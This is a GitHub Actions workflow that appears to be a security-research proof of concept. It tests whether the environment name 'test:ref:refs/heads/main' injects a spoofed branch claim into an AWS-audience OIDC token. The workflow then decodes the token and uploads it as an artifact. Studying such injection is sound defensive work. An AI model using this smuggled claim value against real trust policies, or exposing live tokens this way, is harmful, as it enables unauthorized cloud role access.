name: OIDC Environment Name Injection Test
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  test-injected-env:
    runs-on: ubuntu-latest
    environment: "test:ref:refs/heads/main"
    steps:
      - name: Get OIDC token with injected environment name
        run: |
          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          echo "$TOKEN" > /tmp/oidc_token.txt
          PAYLOAD=$(echo "$TOKEN" | cut -d. -f2)
          echo "=== OIDC Claims (environment: test:ref:refs/heads/main) ==="
          echo "$PAYLOAD" | python3 -c "
          import sys, base64, json
          d = sys.stdin.read().strip()
          p = d + '=' * (4 - len(d) % 4)
          claims = json.loads(base64.urlsafe_b64decode(p))
          print(json.dumps(claims, indent=2))"
      - uses: actions/upload-artifact@v4
        with:
          name: oidc-env-injection-token
          path: /tmp/oidc_token.txt
          retention-days: 1
